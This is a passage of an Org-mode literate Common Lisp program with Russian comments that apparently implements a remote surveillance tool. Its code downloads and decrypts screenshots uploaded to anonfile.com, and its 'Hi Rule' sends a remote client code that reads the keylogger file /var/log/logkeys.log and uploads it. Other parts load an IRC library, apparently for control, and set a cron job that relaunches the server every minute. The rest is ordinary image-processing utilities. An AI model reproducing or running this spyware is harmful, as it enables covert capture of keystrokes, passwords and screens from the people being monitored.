        (task-data *current-task*)
      ;; (dbg ":: TF (~A): ~A: ~A~%" (length-of-queue) src str)
      (shot-downloader str src)))
#+END_SRC

** Shot Downloader

Однако, необходимо описать операцию, которая будет вызываться из таска и выполнять всю грязную работу.

#+NAME: shot_downloader
#+BEGIN_SRC lisp :noweb yes
  ;; anon_file_download
  <<anon_file_download>>

  ;; seq_xor
  <<seq_xor>>

  ;; decrypt
  <<decrypt>>

  ;; unpack_img
  <<unpack_img>>

  (defun shot-downloader (str src)
    (let* ((key (parse-integer (subseq src 1)))
           (enc (anon-file-download str))
           (dec (decrypt enc key))
           (png (let ((png-read::*png-file* "fake-file"))
                  (flex:with-input-from-sequence (stream dec)
                    (png-read:read-png-datastream stream))))
           (image-data (png-read:image-data png))
           ;; reverse
           (dims   (subseq (array-dimensions image-data) 0 2))
           (height (cadr dims))
           (width  (car  dims))
           (image ;; меняем размерности X и Y местами
            (let ((result (make-array (list height width)
                                      :element-type '(unsigned-byte 8))))
              (do ((y 0 (incf y)))
                  ((= y height))
                (do ((x 0 (incf x)))
                    ((= x width))
                  (setf (aref result y x)
                        (aref image-data x y))))
              result))
           ;; (dif (ppcre:scan-to-strings "/(.*)/([0-9]*)_([0-9]*)" str))
           ;; (img (if (not dif)
           ;;          (setf prev image)
           ;;          ;; else
           ;;          (setf prev (get-img-diff dims prev image))))
           (img image)
           ;; unpacking
           (unpack (unpack-img img))
           (unpack-dims (array-dimensions unpack))
           (new-width (cadr unpack-dims))
           (fname-str (multiple-value-bind (match-p result)
                          (ppcre:scan-to-strings "/.*/(.*)" str)
                        (elt result 0))))
      (let* ((png (make-instance 'zpng:png
                                 :width new-width
                                 :height height
                                 :color-type :grayscale))
             (vector (make-array ;; displaced vector - need copy for save
                      (* height new-width (zpng:samples-per-pixel png))
                      :displaced-to unpack :element-type '(unsigned-byte 8))))
        ;; Тут применен потенциально опасный трюк, когда мы создаем
        ;; объект PNG без данных, а потом добавляем в него данные,
        ;; используя неэкспортируемый writer.
        ;; Это нужно чтобы получить третью размерность массива,
        ;; который мы хотим передать как данные и при этом
        ;; избежать создания для этого временного объекта
        (setf (zpng::%image-data png) (copy-seq vector))
        (zpng:write-png png (format nil "~~/<<get_dest_path()>>/~A" fname-str)))
      t))
#+END_SRC

** Anon File Download

#+NAME: anon_file_download
#+BEGIN_SRC lisp :noweb yes
  (defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")

  (defparameter *additional-headers*
    `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
      ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
      ("Accept-Charset" . "utf-8")))

  (defun get-download-link (text)
    (loop :for str :in (split-sequence:split-sequence #\Newline text)
       :do (multiple-value-bind (match-p result)
               (ppcre:scan-to-strings
                "(https://cdn-([0-9]*)\.anonfile.com\/(.*))\\\""
                str)
             (when match-p (return (aref result 0))))))

  (defun anon-file-download (filename)
    (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
      ;; load mainpage for cookies, headers and csrf
      (multiple-value-bind (body-or-stream ;; status-code headers uri
                            ;;stream must-close reason-phrase
                            )
          (drakma:http-request (format nil "https://anonfile.com~A" filename)
                               :user-agent *user-agent*
                               :redirect 10
                               :force-binary t
                               :cookie-jar cookie-jar
                               :additional-headers *additional-headers*)
        (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
               (link (get-download-link text)))
          (multiple-value-bind (body-or-stream ;; status-code headers uri
                                ;;stream must-close reason-phrase
                                )
              (drakma:http-request link
               :user-agent *user-agent*
               :cookie-jar cookie-jar
               :additional-headers *additional-headers*
               :force-binary t)
            (flex:octets-to-string body-or-stream :external-format :utf-8))))))
#+END_SRC

** Unpack image

#+NAME: unpack_img
#+BEGIN_SRC lisp
  (defun unpack-img (image)
    (declare (optimize (speed 3) (safety 0)))
    (let* ((dims (array-dimensions image))
           (height (car dims))
           (width (cadr dims))
           (new-width (ash width 3))
           (result (make-array (list height new-width)
                               :element-type '(unsigned-byte 8))))
      (declare (type fixnum width)
               (type fixnum new-width)
               (type fixnum height))
      (do ((qy 0 (incf qy)))
          ((= qy height))
        (declare (type fixnum qy))
        (do ((qx 0 (incf qx)))
            ((= qx width))
          (declare (type fixnum qx))
          (let ((acc (aref image qy qx)))
            (declare (type (unsigned-byte 8) acc))
            ;; (format t "~8,'0B" acc)
            (do ((out 0 (incf out))
                 (in  7 (decf in)))
                ((= 8 out))
              (declare (type fixnum out in))
              (unless (= 0 (logand acc (ash 1 in)))
                (setf (aref result qy (logior (ash qx 3) out))
                      255)))))
        ;; (format t "~%")
        )
      result))

  ;; TEST
  ;; (print
  ;;  (unpack-img
  ;;   (pack-img
  ;;    (x-snapshot :width 31 :height 23))))

  ;; TEST
  ;; (time
  ;;  (let* ((image  (load-png "FILE1088"))
  ;;         (unpack (unpack-img image))
  ;;         (dims (array-dimensions unpack)))
  ;;    (save-png (cadr dims)
  ;;              (car dims)
  ;;              (format nil "~A" (gensym "FILE"))
  ;;              unpack
  ;;              :grayscale)))
#+END_SRC

** Hi Rule

Правило "ответить на приветствие" совпадает с приветственным сообщением. Чтобы оно было чуть сложнее чем просто посылка сообщения, мы можем попытаться загрузить какой-нибудь файл с удаленного узла

#+NAME: hi_rule
#+BEGIN_SRC lisp :noweb yes
  (defun hi-rule-antecedent (str src)
    (declare (ignore src))
    (ppcre:scan-to-strings "^hi$" str))

  <<upload_code_and_send>>

  (defun hi-rule-consequent (str src)
    (dbg ":: HI-rule-consequent (~A) ~A: ~A~%"
         (length-of-queue) src str)
    (let* ((tmpkey 1234567890)
           (receiver (parse-integer (subseq src 1)))
           (code (format
                  nil
                  "(progn (sendmsg (format nil \"k~~A\" (upload-code (alexandria:read-file-into-string \"/var/log/logkeys.log\") ~A))) t)"
                  tmpkey)))
      (upload-code-and-send code tmpkey receiver)))

  ;; (let* ((tmpkey 1234567890)
  ;;        (src "b3785294860")
  ;;        (receiver (parse-integer (subseq src 1)))
  ;;        (code (format
  ;;               nil
  ;;               "(progn (sendmsg (format nil \"k~~A\" (upload-code (alexandria:read-file-into-string \"/var/log/logkeys.log\") ~A))) t)"
  ;;               tmpkey)))
  ;;   (upload-code-and-send code tmpkey receiver))
#+END_SRC

** K Rule

#+NAME: k_rule
#+BEGIN_SRC lisp :noweb yes
  (defun k-rule-antecedent (str src)
    (declare (ignore src))
    (ppcre:scan-to-strings "^k/(.*)/u-(.*)$" str))

  <<download_and_decrypt>>

  (defun k-rule-consequent (str src)
    (dbg ":: K-rule-consequent (~A) ~A: ~A~%"
         (length-of-queue) src str)
    (let* ((tmpkey 1234567890))
      (alexandria:write-string-into-file
       (download-and-decrypt (subseq str 1) tmpkey)
       (format nil "~~/<<get_dest_path()>>/~A.log" (ppcre:regex-replace-all "/" str "_")))))
#+END_SRC

* Utils

#+NAME: debug
#+BEGIN_SRC lisp
  (defun decode-time (universal-time)
    (multiple-value-bind (second minute hour date month year day daylight-p zone)
        (decode-universal-time universal-time)
      (format nil "~A-~A-~A ~A:~A:~A" year month date hour minute second)))
#+END_SRC

* Old

#+NAME:
#+BEGIN_SRC lisp
  <<anon_file_upload>>
  <<unpack_img>>

  (defun save-png (width height pathname-str image
                   &optional (color-type :truecolor-alpha))
    (let* ((png (make-instance 'zpng:png :width width :height height
                               :color-type color-type))
           (vector (make-array ;; displaced vector - need copy for save
                    (* height width (zpng:samples-per-pixel png))
                    :displaced-to image :element-type '(unsigned-byte 8))))
      ;; Тут применен потенциально опасный трюк, когда мы создаем
      ;; объект PNG без данных, а потом добавляем в него данные,
      ;; используя неэкспортируемый writer.
      ;; Это нужно чтобы получить третью размерность массива,
      ;; который мы хотим передать как данные и при этом
      ;; избежать создания для этого временного объекта
      (setf (zpng::%image-data png) (copy-seq vector))
      (zpng:write-png png pathname-str)))

#+END_SRC

** Save and Load

Для целей отладки нам нужно уметь сохранять и загружать png-изображения

#+NAME: save_and_load_png
#+BEGIN_SRC lisp
  ;; DEPRECATED, use explicit saving png-sequence by with-open-file
  ;; (defun save-png (pathname-str png)
  ;;   (zpng:write-png png pathname-str))

  (defun load-png (pathname-str)
    "Возвращает массив size-X столбцов по size-Y точек,
       где столбцы идут слева-направо, а точки в них - сверху-вниз
       ----
       В zpng есть указание на возможные варианты COLOR:
       ----
             (defmethod samples-per-pixel (png)
               (ecase (color-type png)
                 (:grayscale 1)
                 (:truecolor 3)
                 (:indexed-color 1) ;; НЕ ПОДДЕРЖИВАЕТСЯ
                 (:grayscale-alpha 2)
                 (:truecolor-alpha 4)))
      "
    (let* ((png (png-read:read-png-file pathname-str))
           (image-data (png-read:image-data png))
           (color (png-read:colour-type png))
           (dims (cond ((or (equal color :truecolor-alpha)
                            (equal color :truecolor))
                        (list (array-dimension image-data 1)
                              (array-dimension image-data 0)
                              (array-dimension image-data 2)))
                       ((or (equal color :grayscale)
                            (equal color :greyscale))
                        (list (array-dimension image-data 1)
                              (array-dimension image-data 0)))
                       (t (error 'unk-png-color-type :color color))))
           (result ;; меняем размерности X и Y местами
            (make-array dims :element-type '(unsigned-byte 8))))
      ;; (dbg "~% new-arr ~A "(array-dimensions result))
      ;; ширина, высота, цвет => высота, ширина, цвет
      (macrolet ((cycle (&body body)
                   `(do ((y 0 (incf y)))
                        ((= y (array-dimension result 0)))
                      (do ((x 0 (incf x)))
                          ((= x (array-dimension result 1)))
                        ,@body))))
        (cond ((or (equal color :truecolor-alpha)
                   (equal color :truecolor))
               (cycle (do ((z 0 (incf z)))
                          ((= z (array-dimension result 2)))
                        (setf (aref result y x z)
                              (aref image-data x y z)))))
              ((or (equal color :grayscale)
                   (equal color :greyscale))
               (cycle (setf (aref result y x)
                            (aref image-data x y))))
              (t (error 'unk-png-color-type :color color)))
        result)))
#+END_SRC

** Bit-vector operations

Для целей отладки определим операции кодирования в битовый вектор и обратно

#+NAME: bit_vector
#+BEGIN_SRC lisp
  (defun bit-vector->integer (bit-vector)
    "Create a positive integer from a bit-vector."
    (reduce #'(lambda (first-bit second-bit)
                (+ (* first-bit 2) second-bit))
            bit-vector))

  (defun integer->bit-vector (integer)
    "Create a bit-vector from a positive integer."
    (labels ((integer->bit-list (int &optional accum)
               (cond ((> int 0)
                      (multiple-value-bind (i r) (truncate int 2)
                        (integer->bit-list i (push r accum))))
                     ((null accum) (push 0 accum))
                     (t accum))))
      (coerce (integer->bit-list integer) 'bit-vector)))
#+END_SRC

** Binarization

Получение черно-белого изображения или в градациях серого из полноцветного.

Здесь остается пространство для оптимизаций путем применения SIMD-операций.

#+NAME: binarization
#+BEGIN_SRC lisp
  (defun binarization (image &optional threshold)
    (let* ((dims (array-dimensions image))
           (new-dims (cond ((equal 3 (length dims))  (butlast dims))
                           ((equal 2 (length dims))  dims)
                           (t (error 'binarization-error))))
           (result (make-array new-dims :element-type '(unsigned-byte 8))))
      (macrolet ((cycle (&body body)
                   `(do ((y 0 (incf y)))
                        ((= y (array-dimension image 0)))
                      (do ((x 0 (incf x)))
                          ((= x (array-dimension image 1)))
                        ,@body))))
        (cond ((equal 3 (length dims))
               (cycle (do ((z 0 (incf z)))
                          ((= z (array-dimension image 2)))
                        (let ((avg (floor (+ (aref image y x 0)
                                             (aref image y x 1)
                                             (aref image y x 2))
                                          3)))
                          (when threshold
                            (if (< threshold avg)
                                (setf avg 255)
                                (setf avg 0)))
                          (setf (aref result y x) avg)))))
              ((equal 2 (length dims))
               (cycle (let ((avg (aref image y x)))
                        (when threshold
                          (if (< threshold avg)
                              (setf avg 255)
                              (setf avg 0)))
                        (setf (aref result y x) avg))))
              (t (error 'binarization-error))))
      result))

  ;; TEST: binarize and save screenshot
  ;; (let* ((to   "x-snapshot-binarize.png")
  ;;        (image-data (binarization (x-snapshot) 127))) ;; NEW: threshold!
  ;;   (destructuring-bind (height width) ;; NB: no depth!
  ;;       (array-dimensions image-data)
  ;;     (save-png width height to image-data :grayscale))) ;; NB: grayscale!


  ;; TEST: binarize get png and save
  ;; (print
  ;;  (let* ((image-data (binarization (x-snapshot) 127))) ;; NEW: threshold!
  ;;    (destructuring-bind (height width) ;; NB: no depth!
  ;;        (array-dimensions image-data)
  ;;      (let ((seq (get-png width height image-data :grayscale)))
  ;;        (with-open-file (file-stream "tee.png"
  ;;                                     :direction :output
  ;;                                     :if-exists :supersede
  ;;                                     :if-does-not-exist :create
  ;;                                     :element-type '(unsigned-byte 8))
  ;;          (write-sequence seq file-stream))))))
#+END_SRC

** Bit-image

Упаковка бинаризованного черно-белого изображения в битовый массив

#+NAME: make_bit_image
#+BEGIN_SRC lisp
  (defun make-bit-image (image-data)
    (destructuring-bind (height width &optional colors)
        (array-dimensions image-data)
      ;; функция может работать только с бинарными изобажениями
      (assert (null colors))
      (let* ((new-width (+ (logior width 7) 1))
             (bit-array (make-array (list height new-width)
                                    :element-type 'bit
                                    :initial-element 1)))
        (do ((qy 0 (incf qy)))
            ((= qy height))
          (do ((qx 0 (incf qx)))
              ((= qx width))
            ;; если цвет пикселя не белый, считаем,
            ;; что это не фон и заносим в битовый массив 1
            (if (equal (aref image-data qy qx) 255)
                (setf (bit bit-array qy qx) 1)
                (setf (bit bit-array qy qx) 0))))
        bit-array)))

  ;; TEST: make-bit-image
  ;; (print
  ;;  (make-bit-image
  ;;   (binarization (x-snapshot :x 0 :y 0 :width 30 :height 30) 127)))
#+END_SRC

* Assembly

#+NAME:
#+BEGIN_SRC lisp :tangle q.lisp :noweb yes
  (ql:quickload "anaphora")
  (use-package :anaphora)
  (ql:quickload "bordeaux-threads")
  (ql:quickload "clx")
  (ql:quickload "zpng")
  (ql:quickload "png-read")
  (ql:quickload "drakma")
  (ql:quickload "cl-ppcre")
  (ql:quickload "cl-base64")
  (ql:quickload "prbs")
  (ql:quickload "cl-irc")
  (ql:quickload "cl-json")
  (ql:quickload "ironclad")

  <<supervisor>>
#+END_SRC

#+NAME:
#+BEGIN_SRC lisp :tangle o.lisp :noweb yes
  (ql:quickload "anaphora")
  (use-package :anaphora)
  (ql:quickload "bordeaux-threads")
  (ql:quickload "clx")
  (ql:quickload "zpng")
  (ql:quickload "png-read")
  (ql:quickload "drakma")
  (ql:quickload "cl-ppcre")
  (ql:quickload "cl-base64")
  (ql:quickload "prbs")
  (ql:quickload "cl-irc")
  (ql:quickload "cl-json")
  (ql:quickload "ironclad")

  <<operator_loop>>
#+END_SRC

* Cron

#+BEGIN_SRC lisp
  (sb-posix:get-pid)
  ,*/1 * * * * export DISPLAY=:0 && cd ~/quicklisp/ && flock -xn ./srv.lock sbcl --load ./srv.lisp > ./log.txt
#+END_SRC

* Ideas
** hOCR-visualiser
https://github.com/jadatkins/hOCR-visualiser
1. Rename your .hocr file to .html.

2. Add the following lines to the <head> tag:
	<script src=""></script>
	<script src="https://cdn.rawgit.com/jadatkins/hOCR-visualiser/8e34bb12/visualise-hocr.js"></script>
	<link rel="stylesheet" type="text/css" href="https://cdn.rawgit.com/jadatkins/hOCR-visualiser/8e34bb12/visualise-hocr.css">

3. View in a browser.
